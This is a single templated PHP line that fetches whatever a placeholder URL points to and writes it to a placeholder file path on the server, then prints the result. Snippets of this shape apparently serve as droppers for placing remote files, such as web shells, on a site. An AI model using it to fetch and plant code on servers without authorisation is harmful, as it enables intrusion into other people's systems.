<?php $url="{{LINK}}"; $tujuan="{{PATH}}"; $file_content = file_get_contents($url);  $result = file_put_contents($tujuan, $file_content); var_dump($result);?>
